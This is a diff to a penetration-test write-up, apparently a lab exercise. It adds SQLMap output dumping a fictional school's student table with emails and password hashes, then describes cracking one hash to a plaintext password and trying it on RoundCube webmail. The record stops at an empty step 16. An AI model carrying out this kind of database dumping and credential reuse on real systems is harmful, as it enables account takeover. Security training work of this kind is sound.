@@ -177,4 +177,32 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
 
 15) Using [SQLMap](https://github.com/sqlmapproject/sqlmap) to enumerate data from the database, I received the following output:
 
-    ![SQLMap_Output_1](Images/SQLMap_Output_1.png)
+    ```
+    Database: school_db
+    Table: students
+    [12 entries]
+    +----+---------+----------------------------+----------+--------+----------------------------------+
+    | id | class   | email                      | name     | gender | password                         |
+    +----+---------+----------------------------+----------+--------+----------------------------------+
+    | 1  | CY2304U | malcolm@potato-school.com  | malcolm  | Male   | 98c5fb0477da411c710a07921cade8cb |
+    | 2  | CY2304U | jaeger@potato-school.com   | jaeger   | Male   | af0f0a77d092493ad15cf8e5e3bca6ea |
+    | 3  | CY2304U | weile@potato-school.com    | weile    | Male   | 1828e186a1dfb3d9b49e2360674e901c |
+    | 4  | CY2304Q | jasmine@potato-school.com  | jasmine  | Female | 1a684e4feecf6e4812ea41f700589b5e |
+    | 5  | CY2304Q | charlene@potato-school.com | charlene | Female | 2b7f195f888bff306af886101c98ce4f |
+    | 6  | CY2304Q | jasper@potato-school.com   | jasper   | Male   | 7810aaa2b13020b68194d3eca71c4d27 |
+    | 7  | CY2304Q | charles@potato-school.com  | charles  | Male   | 365cd1542cf1591f4cad5b0fe7554980 |
+    | 8  | CY2304U | chaewon@potato-school.com  | chaewon  | Female | 09f458fd0b089b1da459423ec11b4ee5 |
+    | 9  | CY2304U | sakura@potato-school.com   | sakura   | Female | 762ac3593f04d665967a696498d15690 |
+    | 10 | CY2304Q | kazuha@potato-school.com   | kazuha   | Female | 81f6f341a102b63c21c14beb2c0ed390 |
+    | 11 | CY2304U | yunjin@potato-school.com   | yunjin   | Female | 6a4d05961a833bd3f9d4250e333464c4 |
+    | 12 | CY2304Q | eunchae@potato-school.com  | eunchae  | Female | db7bb5980eb66c7ad8bd795adcfa5055 |
+    +----+---------+----------------------------+----------+--------+----------------------------------+
+    ```
+
+    In the password column, we can see a string of random characters which seems to be hashes. Using [Crackstation](https://crackstation.net), we recieved the output of the cracked hash for eunchae which is _manchae_.
+
+    [Eunchae_Crackstation_Cracked_Hash](Images/Eunchae_Crackstation_Cracked_Hash.png)
+
+    Now that I have the password of Eunchae's account, I attempted to login into RoundCube Webmail with Eunchae credentials.
+
+16) 
